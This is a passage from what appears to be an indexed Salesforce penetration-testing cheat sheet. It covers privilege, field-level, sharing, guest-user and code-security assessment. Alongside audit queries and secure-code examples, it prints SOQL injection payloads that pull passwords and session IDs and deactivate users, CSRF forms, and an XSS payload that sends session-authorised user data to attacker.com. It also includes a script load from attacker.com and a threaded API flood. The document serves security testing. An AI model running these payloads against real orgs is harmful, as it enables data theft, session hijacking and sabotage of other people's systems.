Profile.PermissionsModifyAllData = true \n   OR (Profile.PermissionsViewAllData = true AND Profile.PermissionsManageUsers = true)\n   OR Profile.PermissionsCustomizeApplication = true\n\n-- Recently elevated users\nSELECT Id, Username, Email, Name, Profile.Name, CreatedDate,\n       (SELECT COUNT() FROM PermissionSetAssignment \n        WHERE AssigneeId = User.Id AND CreatedDate = LAST_N_DAYS:30) as Recent_PermSets\nFROM User \nWHERE Profile.Name LIKE '%Admin%' \n  AND CreatedDate = LAST_N_DAYS:90\n</code></pre></p> <p>Permission Set Analysis: <pre><code>-- High-risk permission sets\nSELECT Id, Name, Description, Type, IsOwnedByProfile,\n       PermissionsModifyAllData, PermissionsViewAllData,\n       PermissionsManageUsers, PermissionsCustomizeApplication,\n       PermissionsApiEnabled,\n       (SELECT COUNT() FROM PermissionSetAssignment \n        WHERE PermissionSetId = PermissionSet.Id) as AssigneeCount\nFROM PermissionSet \nWHERE PermissionsModifyAllData = true \n   OR PermissionsViewAllData = true \n   OR PermissionsManageUsers = true\n   OR PermissionsCustomizeApplication = true\nORDER BY AssigneeCount DESC\n\n-- Permission set assignments with potential issues\nSELECT Id, PermissionSet.Name, PermissionSet.PermissionsModifyAllData,\n       Assignee.Username, Assignee.Profile.Name, AssignmentId,\n       ExpirationDate, CreatedDate, CreatedBy.Name\nFROM PermissionSetAssignment \nWHERE ExpirationDate != null \n   OR (PermissionSet.PermissionsModifyAllData = true AND ExpirationDate = null)\nORDER BY CreatedDate DESC\n</code></pre></p> <p>Impact: Over-privileged users can lead to complete tenant compromise.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#2-field-level-security-assessment","title":"2. Field-Level Security Assessment","text":"<p>Objective: Identify sensitive data exposure through inadequate field-level security.</p> <p>Sensitive Field Discovery: <pre><code>-- Potentially sensitive fields identification\nSELECT EntityDefinition.QualifiedApiName as ObjectName,\n       QualifiedApiName as FieldName, Label, DataType, \n       IsEncrypted, SecurityClassification, ComplianceGroup,\n       Description\nFROM FieldDefinition \nWHERE (Label LIKE '%SSN%' OR Label LIKE '%Social Security%' \n    OR Label LIKE '%Tax%' OR Label LIKE '%EIN%' OR Label LIKE '%TIN%'\n    OR Label LIKE '%Credit Card%' OR Label LIKE '%Bank%' \n    OR Label LIKE '%Account Number%' OR Label LIKE '%Routing%'\n    OR Label LIKE '%Password%' OR Label LIKE '%Secret%' \n    OR Label LIKE '%Key%' OR Label LIKE '%Token%'\n    OR Label LIKE '%Salary%' OR Label LIKE '%Income%'\n    OR Label LIKE '%DOB%' OR Label LIKE '%Birth%')\n   AND IsEncrypted = false\nORDER BY EntityDefinition.QualifiedApiName, SecurityClassification DESC\n\n-- Field accessibility by profile\nSELECT Id, Field, Parent.Name as ProfileName, \n       PermissionsRead, PermissionsEdit\nFROM FieldPermissions \nWHERE Field IN (\n    SELECT QualifiedApiName FROM FieldDefinition \n    WHERE Label LIKE '%SSN%' OR Label LIKE '%Credit%' \n       OR Label LIKE '%Password%' OR Label LIKE '%Salary%'\n)\nORDER BY Field, Parent.Name\n</code></pre></p> <p>Field Access Testing: <pre><code>// Apex script to test field accessibility\npublic class FieldSecurityTester {\n    public static void testFieldAccess(String objectName, String fieldName) {\n        Schema.SObjectType objectType = Schema.getGlobalDescribe().get(objectName);\n        Schema.DescribeSObjectResult objectDescribe = objectType.getDescribe();\n        Schema.SObjectField field = objectDescribe.fields.getMap().get(fieldName);\n\n        if (field != null) {\n            Schema.DescribeFieldResult fieldDescribe = field.getDescribe();\n            System.debug('Field: ' + fieldName);\n            System.debug('Accessible: ' + fieldDescribe.isAccessible());\n            System.debug('Updateable: ' + fieldDescribe.isUpdateable());\n            System.debug('Createable: ' + fieldDescribe.isCreateable());\n\n            // Test actual data access\n            try {\n                String query = 'SELECT Id, ' + fieldName + ' FROM ' + objectName + ' LIMIT 1';\n                List&lt;SObject&gt; records = Database.query(query);\n                System.debug('Query successful - field accessible');\n            } catch (Exception e) {\n                System.debug('Query failed: ' + e.getMessage());\n            }\n        }\n    }\n}\n</code></pre></p> <p>Impact: Unauthorized access to sensitive field data, PII exposure, compliance violations.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#3-record-level-security-analysis","title":"3. Record-Level Security Analysis","text":"<p>Objective: Evaluate sharing model security and identify unauthorized record access.</p> <p>Organization-Wide Defaults Assessment: <pre><code>-- Organization-wide default settings\nSELECT Id, SobjectType, DefaultInternal, DefaultExternal,\n       DefaultCaseOwnerId, DefaultOpportunityOwnerId\nFROM OrganizationWideDefault \nWHERE DefaultInternal = 'Public' OR DefaultExternal = 'Public'\n</code></pre></p> <p>Sharing Rules Analysis: <pre><code>-- Account sharing rules\nSELECT Id, Name, AccountAccessLevel, CaseAccessLevel, \n       ContactAccessLevel, OpportunityAccessLevel, \n       AccessMapping, Description, SharedToType\nFROM AccountSharingRule \nWHERE AccountAccessLevel IN ('Edit', 'All')\n\n-- Custom object sharing rules  \nSELECT Id, Name, AccessLevel, SobjectType, Description,\n       SharedToType, SharedTo\nFROM CustomObjectSharingRule \nWHERE AccessLevel IN ('Edit', 'All')\n\n-- Manual sharing analysis\nSELECT Id, UserOrGroupId, AccountId, AccountAccessLevel, \n       RowCause, IsDeleted, LastModifiedDate, LastModifiedBy.Name\nFROM AccountShare \nWHERE RowCause = 'Manual' AND AccountAccessLevel IN ('Edit', 'All')\nORDER BY LastModifiedDate DESC\n</code></pre></p> <p>Record Access Testing: <pre><code>// Test record accessibility across different user contexts\npublic class RecordAccessTester {\n    public static void testRecordAccess(Id recordId, Id userId) {\n        System.runAs(new User(Id = userId)) {\n            try {\n                String objectType = recordId.getSObjectType().getDescribe().getName();\n                String query = 'SELECT Id, Name FROM ' + objectType + ' WHERE Id = :recordId';\n                List&lt;SObject&gt; records = Database.query(query);\n\n                if (!records.isEmpty()) {\n                    System.debug('Record accessible to user: ' + userId);\n\n                    // Test edit access\n                    SObject record = records[0];\n                    try {\n                        update record;\n                        System.debug('Record editable by user: ' + userId);\n                    } catch (DmlException e) {\n                        System.debug('Record not editable: ' + e.getMessage());\n                    }\n                }\n            } catch (QueryException e) {\n                System.debug('Record not accessible: ' + e.getMessage());\n            }\n        }\n    }\n}\n</code></pre></p> <p>Impact: Horizontal privilege escalation, unauthorized access to sensitive records.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#4-guest-user-security-assessment","title":"4. Guest User Security Assessment","text":"<p>Objective: Evaluate guest user security and identify potential abuse vectors.</p> <p>Guest User Configuration Analysis: <pre><code>-- Guest user profiles and permissions\nSELECT Id, Name, UserType, PermissionsApiEnabled, PermissionsRunReports,\n       PermissionsViewSetup, PermissionsModifyAllData, PermissionsViewAllData\nFROM Profile \nWHERE Name LIKE '%Guest%' OR UserType = 'Guest'\n\n-- Site guest user settings\nSELECT Id, Name, Status, AdminId, GuestUserId, AnalyticsTrackingCode,\n       ClickjackProtectionLevel, GuestUserProfile.Name,\n       GuestUserProfile.PermissionsApiEnabled\nFROM Site \nWHERE Status = 'Active'\n\n-- Guest user record access via OWD\nSELECT Id, SobjectType, DefaultExternal\nFROM OrganizationWideDefault \nWHERE DefaultExternal IN ('Public', 'PublicReadOnly', 'PublicReadWrite')\n</code></pre></p> <p>Guest User Exploitation Testing: <pre><code>// Guest user API access testing (unauthenticated context)\nfetch('/services/data/v52.0/sobjects/', {\n    method: 'GET',\n    headers: { 'Content-Type': 'application/json' }\n}).then(response =&gt; {\n    if (response.ok) {\n        console.log('Guest API access available');\n        return response.json();\n    }\n}).then(data =&gt; {\n    console.log('Available objects:', data);\n});\n\n// Test guest user SOQL injection\nconst maliciousQuery = \"' UNION SELECT Id, Name FROM User WHERE Profile.Name LIKE '%Admin%'--\";\nfetch('/services/data/v52.0/query/?q=SELECT Id FROM Account WHERE Name = \\'' + maliciousQuery, {\n    method: 'GET'\n});\n</code></pre></p> <p>Impact: Unauthenticated data access, potential for public data exposure.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#data-security-evaluation","title":"Data Security Evaluation","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#1-sensitive-data-discovery-classification","title":"1. Sensitive Data Discovery &amp; Classification","text":"<p>Objective: Identify, catalog, and assess protection of sensitive data.</p> <p>Comprehensive Data Discovery: <pre><code>-- PII and sensitive data identification\nSELECT EntityDefinition.QualifiedApiName as ObjectName,\n       QualifiedApiName as FieldName, Label, DataType, \n       IsEncrypted, SecurityClassification, ComplianceGroup,\n       IsCalculated, IsCompound\nFROM FieldDefinition \nWHERE (Label LIKE '%SSN%' OR Label LIKE '%Social Security%' \n    OR Label LIKE '%Tax%' OR Label LIKE '%Credit Card%' \n    OR Label LIKE '%Bank%' OR Label LIKE '%Passport%'\n    OR Label LIKE '%Driver%' OR Label LIKE '%Medical%'\n    OR QualifiedApiName LIKE '%SSN%' OR QualifiedApiName LIKE '%Tax%')\nORDER BY EntityDefinition.QualifiedApiName, SecurityClassification DESC\n\n-- Financial data discovery  \nSELECT Id, QualifiedApiName, Label, EntityDefinition.QualifiedApiName as ObjectName\nFROM FieldDefinition \nWHERE DataType IN ('Currency', 'Number', 'Percent') \n  AND (Label LIKE '%Amount%' OR Label LIKE '%Price%' \n    OR Label LIKE '%Cost%' OR Label LIKE '%Revenue%' \n    OR Label LIKE '%Budget%' OR Label LIKE '%Payment%')\n\n-- Data volume assessment\nSELECT COUNT() as RecordCount, 'Account' as ObjectType FROM Account\nUNION ALL SELECT COUNT(), 'Contact' FROM Contact  \nUNION ALL SELECT COUNT(), 'Lead' FROM Lead\nUNION ALL SELECT COUNT(), 'Opportunity' FROM Opportunity\nUNION ALL SELECT COUNT(), 'Case' FROM Case\n</code></pre></p> <p>Pattern-Based Sensitive Data Detection: <pre><code>// Apex script for sensitive data pattern detection\npublic class SensitiveDataScanner {\n    public static void scanForPatterns(String objectName, String fieldName, Integer limitRecords) {\n        String query = 'SELECT Id, ' + fieldName + ' FROM ' + objectName + \n                      ' WHERE ' + fieldName + ' != null LIMIT ' + limitRecords;\n\n        try {\n            List&lt;SObject&gt; records = Database.query(query);\n            for (SObject record : records) {\n                String fieldValue = String.valueOf(record.get(fieldName));\n\n                // Pattern matching for sensitive data\n                if (Pattern.matches('\\\\d{3}-\\\\d{2}-\\\\d{4}', fieldValue)) {\n                    System.debug('SSN pattern found: ' + record.Id);\n                }\n                if (Pattern.matches('\\\\d{4}[\\\\s-]?\\\\d{4}[\\\\s-]?\\\\d{4}[\\\\s-]?\\\\d{4}', fieldValue)) {\n                    System.debug('Credit card pattern found: ' + record.Id);\n                }\n                if (Pattern.matches('\\\\d{9}', fieldValue)) {\n                    System.debug('Tax ID pattern found: ' + record.Id);\n                }\n            }\n        } catch (Exception e) {\n            System.debug('Error scanning field: ' + e.getMessage());\n        }\n    }\n}\n</code></pre></p> <p>Impact: Identifies data requiring enhanced protection and compliance considerations.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#2-data-export-exfiltration-assessment","title":"2. Data Export &amp; Exfiltration Assessment","text":"<p>Objective: Identify data export capabilities that could enable bulk data theft.</p> <p>Data Export Analysis: <pre><code>-- Data export job history\nSELECT Id, Type, Status, CreatedDate, CreatedBy.Name, \n       StartedDate, EndDate, JobItemsProcessed\nFROM DataExport \nORDER BY CreatedDate DESC\n\n-- Scheduled export jobs\nSELECT Id, Name, CronExpression, State, NextFireTime, \n       CreatedBy.Name, CreatedDate\nFROM CronJobDetail \nWHERE JobType = 'DataExport'\n\n-- Reports with export capabilities\nSELECT Id, Name, Format, DeveloperName, CreatedBy.Name, \n       IsDeleted, LastRunDate, Description\nFROM Report \nWHERE Format IN ('TABULAR', 'SUMMARY', 'MATRIX') \nORDER BY LastRunDate DESC NULLS LAST\n</code></pre></p> <p>Bulk API Testing: <pre><code>def test_bulk_export(session_id, instance_url, sobject_type):\n    \"\"\"Test bulk data extraction capabilities\"\"\"\n    job_xml = f\"\"\"&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n    &lt;jobInfo xmlns=\"http://www.force.com/2009/06/async/dataloader\"&gt;\n        &lt;operation&gt;query&lt;/operation&gt;\n        &lt;object&gt;{sobject_type}&lt;/object&gt;\n        &lt;contentType&gt;CSV&lt;/contentType&gt;\n    &lt;/jobInfo&gt;\"\"\"\n\n    headers = {\n        'X-SFDC-Session': session_id,\n        'Content-Type': 'application/xml'\n    }\n\n    response = requests.post(\n        f\"{instance_url}/services/async/52.0/job\",\n        data=job_xml,\n        headers=headers\n    )\n\n    if response.status_code == 201:\n        print(f\"Bulk export job created for {sobject_type}\")\n        return True\n    else:\n        print(f\"Bulk export failed: {response.status_code}\")\n        return False\n</code></pre></p> <p>Impact: Identifies vectors for large-scale data exfiltration.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#3-encryption-assessment","title":"3. Encryption Assessment","text":"<p>Objective: Evaluate data encryption implementation and identify protection gaps.</p> <p>Platform Encryption Analysis: <pre><code>-- Encrypted fields inventory\nSELECT QualifiedApiName, Label, IsEncrypted, \n       EntityDefinition.QualifiedApiName as ObjectName\nFROM FieldDefinition \nWHERE IsEncrypted = true \nORDER BY EntityDefinition.QualifiedApiName\n\n-- Encryption coverage gaps for sensitive fields\nSELECT QualifiedApiName, Label, IsEncrypted,\n       EntityDefinition.QualifiedApiName as ObjectName\nFROM FieldDefinition \nWHERE IsEncrypted = false \n  AND (Label LIKE '%SSN%' OR Label LIKE '%Credit%' \n    OR Label LIKE '%Bank%' OR Label LIKE '%Password%' \n    OR Label LIKE '%Secret%')\nORDER BY EntityDefinition.QualifiedApiName\n\n-- Encryption key information (if accessible)\nSELECT Id, MasterLabel, IsActive, CreatedDate, LastModifiedDate\nFROM EncryptionKey\n\n-- Encryption policy analysis\nSELECT Id, MasterLabel, IsActive, Description\nFROM EncryptionPolicy\n</code></pre></p> <p>Encryption Bypass Testing: <pre><code>// Test encrypted field access patterns\npublic class EncryptionTester {\n    public static void testEncryptedFieldAccess() {\n        try {\n            List&lt;Contact&gt; contacts = [SELECT Id, SSN__c FROM Contact LIMIT 10];\n            for (Contact c : contacts) {\n                if (c.SSN__c != null) {\n                    System.debug('Encrypted field accessible: ' + c.Id);\n                    // In properly encrypted fields, this should show masked values\n                    System.debug('Value: ' + c.SSN__c);\n                }\n            }\n        } catch (Exception e) {\n            System.debug('Encryption access error: ' + e.getMessage());\n        }\n    }\n}\n</code></pre></p> <p>Impact: Identifies unprotected sensitive data vulnerable to exposure.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#custom-code-security-analysis","title":"Custom Code Security Analysis","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#1-soqlsosl-injection-vulnerabilities","title":"1. SOQL/SOSL Injection Vulnerabilities","text":"<p>Objective: Identify injection vulnerabilities in dynamic queries.</p> <p>Vulnerable Pattern Detection: <pre><code>-- Find Apex classes with potential SOQL injection\nSELECT Id, Name, Body\nFROM ApexClass \nWHERE Status = 'Active' \n  AND (Body LIKE '%Database.query(%' OR Body LIKE '%Database.getQueryLocator(%')\n  AND Body LIKE '%+%'\n\n-- Find classes using dynamic SOSL\nSELECT Id, Name, Body\nFROM ApexClass\nWHERE Status = 'Active'\n  AND Body LIKE '%Search.query(%'\n  AND Body LIKE '%+%'\n</code></pre></p> <p>Static Analysis Examples: <pre><code>// VULNERABLE: Direct string concatenation\npublic List&lt;Account&gt; searchAccounts(String searchTerm) {\n    String query = 'SELECT Id, Name FROM Account WHERE Name LIKE \\'%' + searchTerm + '%\\'';\n    return Database.query(query);\n}\n\n// VULNERABLE: ORDER BY injection\npublic List&lt;Account&gt; getAccountsSorted(String sortField) {\n    String query = 'SELECT Id, Name FROM Account ORDER BY ' + sortField;\n    return Database.query(query);\n}\n\n// SECURE: Using bind variables\npublic List&lt;Account&gt; searchAccountsSecure(String searchTerm) {\n    String searchKey = '%' + searchTerm + '%';\n    return [SELECT Id, Name FROM Account WHERE Name LIKE :searchKey];\n}\n</code></pre></p> <p>Injection Payloads: <pre><code>-- Data extraction payload\ntest%' UNION SELECT Id, Password__c FROM User WHERE Profile.Name = 'System Administrator' AND Name LIKE '%\n\n-- Privilege escalation payload  \ntest%' UNION SELECT Id FROM PermissionSetAssignment WHERE PermissionSet.Name = 'Admin_Rights' AND AssigneeId = '005XX000001b0Qw' AND Id LIKE '%\n\n-- Information disclosure payload\ntest%' UNION SELECT Id, SessionId__c FROM Custom_Session__c WHERE User__c = '005XX000001b0Qw' AND Id LIKE '%\n\n-- ORDER BY subquery injection\nName (SELECT Name FROM Contact WHERE LastName = 'Smith')\n</code></pre></p> <p>Advanced SOQL Injection Testing: <pre><code>public class SOQLInjectionTester {\n    public static void testDynamicQuery(String userInput) {\n        try {\n            // Test various injection payloads\n            List&lt;String&gt; payloads = new List&lt;String&gt;{\n                '\\' OR Name != \\'',\n                '\\' UNION SELECT Id FROM User--',\n                '\\'; UPDATE User SET IsActive = false; SELECT Id FROM Account WHERE Name = \\'',\n                '\\' AND (SELECT COUNT() FROM User) &gt; 0 AND Name = \\''\n            };\n\n            for (String payload : payloads) {\n                try {\n                    String query = 'SELECT Id FROM Account WHERE Name = \\'' + payload + '\\'';\n                    List&lt;SObject&gt; results = Database.query(query);\n                    System.debug('Payload successful: ' + payload);\n                } catch (Exception e) {\n                    System.debug('Payload blocked: ' + payload + ' - ' + e.getMessage());\n                }\n            }\n        } catch (Exception e) {\n            System.debug('Testing error: ' + e.getMessage());\n        }\n    }\n}\n</code></pre></p> <p>Impact: Data exfiltration, authentication bypass, privilege escalation.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#2-authorization-bypass-in-apex","title":"2. Authorization Bypass in Apex","text":"<p>Objective: Identify missing sharing enforcement and CRUD/FLS checks.</p> <p>Sharing Bypass Detection: <pre><code>// VULNERABLE: Missing sharing enforcement\npublic without sharing class DataController {\n    public List&lt;Account&gt; getAllAccounts() {\n        return [SELECT Id, Name, Revenue__c FROM Account]; // Bypasses sharing rules\n    }\n}\n\n// VULNERABLE: No sharing keyword (defaults to without sharing in many contexts)\npublic class UnsafeController {\n    @AuraEnabled\n    public static List&lt;Contact&gt; getContacts() {\n        return [SELECT Id, Name, Email, SSN__c FROM Contact]; // System context\n    }\n}\n\n// SECURE: Proper sharing enforcement\npublic with sharing class SecureController {\n    public List&lt;Account&gt; getAccessibleAccounts() {\n        return [SELECT Id, Name FROM Account WITH SECURITY_ENFORCED];\n    }\n}\n</code></pre></p> <p>CRUD/FLS Bypass Examples: <pre><code>// VULNERABLE: Missing object-level permissions check\npublic class UnsafeController {\n    public void createAccount(String name) {\n        Account acc = new Account(Name = name);\n        insert acc; // No createable() check\n    }\n}\n\n// VULNERABLE: Missing field-level security check\npublic class FieldBypassController {\n    public void updateSensitiveField(Id accountId, String ssnValue) {\n        Account acc = new Account(Id = accountId, SSN__c = ssnValue);\n        update acc; // No field updateable() check\n    }\n}\n\n// SECURE: Proper security checks\npublic class SecureController {\n    public void createAccountSecure(String name) {\n        if (!Schema.sObjectType.Account.isCreateable()) {\n            throw new AuraHandledException('Access Denied');\n        }\n\n        Account acc = new Account(Name = name);\n        insert acc;\n    }\n}\n</code></pre></p> <p>Automated Vulnerability Scanning: <pre><code>public class ApexSecurityScanner {\n    public static void scanForSecurityIssues() {\n        List&lt;ApexClass&gt; classes = [SELECT Id, Name, Body FROM ApexClass WHERE Status = 'Active'];\n\n        for (ApexClass cls : classes) {\n            String body = cls.Body.toLowerCase();\n\n            // Check for SOQL injection patterns\n            if (body.contains('database.query(') &amp;&amp; body.contains(' + ')) {\n                System.debug('Potential SOQL injection in: ' + cls.Name);\n            }\n\n            // Check for missing sharing enforcement\n            if (!body.contains('with sharing') &amp;&amp; !body.contains('inherited sharing')) {\n                System.debug('No sharing enforcement in: ' + cls.Name);\n            }\n\n            // Check for direct DML without security checks\n            if ((body.contains('insert ') || body.contains('update ') || body.contains('delete ')) \n                &amp;&amp; !body.contains('iscreatable') &amp;&amp; !body.contains('isupdateable') \n                &amp;&amp; !body.contains('isdeletable')) {\n                System.debug('Missing CRUD checks in: ' + cls.Name);\n            }\n        }\n    }\n}\n</code></pre></p> <p>Impact: Complete bypass of Salesforce security model, privilege escalation.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#3-visualforce-security-vulnerabilities","title":"3. Visualforce Security Vulnerabilities","text":"<p>Objective: Identify XSS, CSRF, and information disclosure in Visualforce pages.</p> <p>XSS Vulnerability Patterns: <pre><code>&lt;!-- VULNERABLE: Unescaped output --&gt;\n&lt;apex:page controller=\"MyController\"&gt;\n    &lt;apex:outputText value=\"{!userInput}\" escape=\"false\"/&gt;\n\n    &lt;!-- VULNERABLE: Direct parameter access --&gt;\n    &lt;script&gt;\n        var userdata = '{!$CurrentPage.parameters.data}';\n    &lt;/script&gt;\n\n    &lt;!-- VULNERABLE: Unvalidated rich text --&gt;\n    &lt;apex:inputField value=\"{!record.Description__c}\" richText=\"true\"/&gt;\n&lt;/apex:page&gt;\n\n&lt;!-- SECURE: Proper escaping --&gt;\n&lt;apex:page controller=\"MyController\"&gt;\n    &lt;apex:outputText value=\"{!HTMLENCODE(userInput)}\"/&gt;\n    &lt;script&gt;\n        var userdata = '{!JSENCODE($CurrentPage.parameters.data)}';\n    &lt;/script&gt;\n&lt;/apex:page&gt;\n</code></pre></p> <p>XSS Testing Payloads: <pre><code>&lt;!-- Basic XSS payload --&gt;\n&lt;script&gt;alert('XSS')&lt;/script&gt;\n\n&lt;!-- Event handler XSS --&gt;\n&lt;img src=\"x\" onerror=\"alert('XSS')\"&gt;\n\n&lt;!-- JavaScript protocol --&gt;\n&lt;a href=\"javascript:alert('XSS')\"&gt;Click&lt;/a&gt;\n\n&lt;!-- Advanced payload for data extraction --&gt;\n&lt;script&gt;\nfetch('/services/data/v52.0/sobjects/User/', {\n    headers: {'Authorization': 'Bearer ' + '{!$Api.Session_ID}'}\n}).then(r=&gt;r.json()).then(d=&gt;fetch('http://attacker.com/exfil?data='+btoa(JSON.stringify(d))));\n&lt;/script&gt;\n\n&lt;!-- SVG-based XSS --&gt;\n&lt;svg/onload=alert(document.domain)&gt;\n\n&lt;!-- Style-based XSS --&gt;\n&lt;div style=\"animation-name:rotation\" onanimationstart=\"alert(1)\" x=\"\"&gt;\n</code></pre></p> <p>CSRF Vulnerability Testing: <pre><code>&lt;!-- Test CSRF protection --&gt;\n&lt;form action=\"/apex/VulnerablePage\" method=\"POST\"&gt;\n    &lt;input type=\"hidden\" name=\"action\" value=\"deleteRecord\"&gt;\n    &lt;input type=\"hidden\" name=\"recordId\" value=\"001XX000003DHPt\"&gt;\n    &lt;input type=\"submit\" value=\"Delete Account\"&gt;\n&lt;/form&gt;\n\n&lt;!-- Advanced CSRF with AJAX --&gt;\n&lt;script&gt;\nfetch('/apex/VulnerablePage', {\n    method: 'POST',\n    headers: {'Content-Type': 'application/x-www-form-urlencoded'},\n    body: 'action=modifyUser&amp;userId=005XX000001b0Qw&amp;isActive=false'\n});\n&lt;/script&gt;\n</code></pre></p> <p>Information Disclosure Assessment: <pre><code>&lt;!-- Check for sensitive data exposure --&gt;\n&lt;apex:page showHeader=\"false\"&gt;\n    Session ID: {!$Api.Session_ID}\n    User ID: {!$User.Id}\n    Organization ID: {!$Organization.Id}\n\n    &lt;!-- Debug information exposure --&gt;\n    &lt;apex:pageMessages /&gt;\n\n    &lt;!-- Server-side debugging --&gt;\n    &lt;apex:outputText value=\"{!debugInfo}\" escape=\"false\"/&gt;\n&lt;/apex:page&gt;\n</code></pre></p> <p>Impact: Session hijacking, credential theft, unauthorized actions.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#4-lightning-component-security","title":"4. Lightning Component Security","text":"<p>Objective: Assess Lightning component security and client-side vulnerabilities.</p> <p>Component Discovery: <pre><code>-- Lightning Web Components\nSELECT Id, DeveloperName, Description, Source\nFROM LightningComponentBundle \nWHERE IsDeleted = false\n\n-- Aura Components  \nSELECT Id, DeveloperName, Description, Source\nFROM AuraDefinitionBundle \nWHERE IsDeleted = false\n</code></pre></p> <p>Client-Side Vulnerabilities: <pre><code>// VULNERABLE: Exposing sensitive data in component events\n({\n    sendData: function(component, event, helper) {\n        var sensitiveData = component.get(\"v.sessionId\");\n        var evt = $A.get(\"e.c:DataEvent\");\n        evt.setParams({\n            \"data\": sensitiveData // Sensitive data in event\n        });\n        evt.fire();\n    }\n})\n\n// VULNERABLE: Client-side validation only\n({\n    validateInput: function(component, event, helper) {\n        var isValid = true; // Client-side only validation\n        if (isValid) {\n            helper.performSensitiveAction(component);\n        }\n    }\n})\n\n// VULNERABLE: Unsafe DOM manipulation\n({\n    updateContent: function(component, event, helper) {\n        var userInput = event.getParam('input');\n        var element = component.find(\"content\").getElement();\n        element.innerHTML = userInput; // XSS risk\n    }\n})\n</code></pre></p> <p>Content Security Policy Testing: <pre><code>// Test CSP bypass attempts\ntry {\n    eval('alert(\"CSP Bypass\")');\n} catch(e) {\n    console.log('CSP blocking eval');\n}\n\n// Test unsafe-inline script execution\ndocument.body.innerHTML += '&lt;script&gt;alert(\"Inline script\")&lt;/script&gt;';\n\n// Test external resource loading\nvar script = document.createElement('script');\nscript.src = 'https://attacker.com/malicious.js';\ndocument.head.appendChild(script);\n</code></pre></p> <p>Lightning Locker Service Assessment: <pre><code>// Test Locker Service restrictions\n({\n    testLockerService: function(component, event, helper) {\n        try {\n            // Attempt DOM manipulation outside component\n            document.getElementById('external-element').innerHTML = 'Modified';\n        } catch(e) {\n            console.log('Locker Service blocking DOM access');\n        }\n\n        try {\n            // Attempt global variable access\n            window.sensitiveGlobalVar = 'compromised';\n        } catch(e) {\n            console.log('Locker Service blocking global access');\n        }\n    }\n})\n</code></pre></p> <p>Impact: Client-side code execution, component manipulation, data exposure.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#platform-configuration-security","title":"Platform Configuration Security","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#1-critical-security-settings-audit","title":"1. Critical Security Settings Audit","text":"<p>Objective: Review platform-wide security configurations for misconfigurations.</p> <p>Network Security Configuration: <pre><code>-- IP restrictions analysis\nSELECT Id, IpAddress, IpAddressMask, Description, CreatedDate\nFROM IpRestriction \nORDER BY CreatedDate DESC\n\n-- Login IP ranges by profile\nSELECT Id, Profile.Name, StartAddress, EndAddress\nFROM LoginIpRange \nORDER BY Profile.Name\n</code></pre></p> <p>Session Security Settings (Setup \u2192 Security \u2192 Session Settings): - Lock sessions to IP address: \u2713 Enabled - Lock sessions to domain: \u2713 Enabled - Force relogin after Login-As-User: \u2713 Enabled - Enable clickjack protection: \u2713 Enabled - Enable Content Sniffing protection: \u2713 Enabled - Enable XSS protection: \u2713 Enabled - Require HttpOnly attribute: \u2713 Enabled - Require Secure attribute: \u2713 Enabled</p> <p>Password Policy Assessment: <pre><code>-- Comprehensive password policy analysis\nSELECT Id, MinPasswordLength, PasswordComplexity, PasswordExpiration,\n       PasswordHistoryRestriction, MaxLoginAttempts, LockoutInterval,\n       MinPasswordAge, PasswordQuestion, QuestionRestriction\nFROM PasswordPolicy\n\n-- Password policy variations by profile\nSELECT Id, Profile.Name, MinPasswordLength, PasswordComplexity\nFROM ProfilePasswordPolicy \nORDER BY Profile.Name\n</code></pre></p> <p>Impact: Misconfigurations create attack vectors for session hijacking and brute force attacks.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#2-api-security-configuration","title":"2. API Security Configuration","text":"<p>Objective: Evaluate API access controls and identify abuse vectors.</p> <p>API Access Analysis: <pre><code>-- Profile API permissions\nSELECT Id, Name, PermissionsApiEnabled, PermissionsApiUserOnly,\n       PermissionsBulkApiHardDelete, PermissionsConnectOrgToEnvironmentHub\nFROM Profile \nWHERE PermissionsApiEnabled = true\n\n-- API usage statistics\nSELECT Id, Application, Identifier, Type, Status, \n       RequestsLast24Hours, RequestsLastHour\nFROM ApiUsage \nORDER BY RequestsLast24Hours DESC\n\n-- REST API endpoints analysis\nSELECT Id, DeveloperName, NamespacePrefix, HttpMethods, \n       Description, Status\nFROM RestResource \nWHERE Status = 'Active'\n</code></pre></p> <p>Connected Apps Security Review: <pre><code>-- Connected applications configuration\nSELECT Id, Name, ContactEmail, CallbackUrl, ConsumerKey, \n       CreatedDate, Description, OptionsFullScopeApprovals,\n       OptionsRefreshTokenValidityMetric, RefreshTokenValidityPeriod\nFROM ConnectedApplication \nORDER BY CreatedDate DESC\n\n-- OAuth policies analysis\nSELECT Id, ConnectedApp.Name, PolicyType, PolicyValue, \n       Description, CreatedDate\nFROM ConnectedAppOauthPolicy\n</code></pre></p> <p>API Rate Limiting Testing: <pre><code>def test_api_rate_limits(base_url, session_id, num_requests=1000):\n    \"\"\"Test API rate limiting implementation\"\"\"\n    headers = {\n        'Authorization': f'Bearer {session_id}',\n        'Content-Type': 'application/json'\n    }\n\n    successful_requests = 0\n    rate_limited_requests = 0\n\n    def make_request():\n        nonlocal successful_requests, rate_limited_requests\n        try:\n            response = requests.get(\n                f\"{base_url}/services/data/v52.0/sobjects/\",\n                headers=headers,\n                timeout=5\n            )\n            if response.status_code == 200:\n                successful_requests += 1\n            elif response.status_code == 429:\n                rate_limited_requests += 1\n        except Exception as e:\n            print(f\"Request failed: {e}\")\n\n    # Rapid fire requests\n    threads = []\n    for i in range(num_requests):\n        thread = threading.Thread(target=make_request)\n        threads.append(thread)\n        thread.start()\n\n        if i % 100 == 0:\n            time.sleep(0.1)\n\n    for thread in threads:\n        thread.join()\n\n    print(f\"Successful: {successful_requests}, Rate limited: {rate_limited_requests}\")\n    if rate_limited_requests == 0:\n        print(\"WARNING: No rate limiting detected\")\n</code></pre></p> <p>Impact: Uncontrolled API access enables 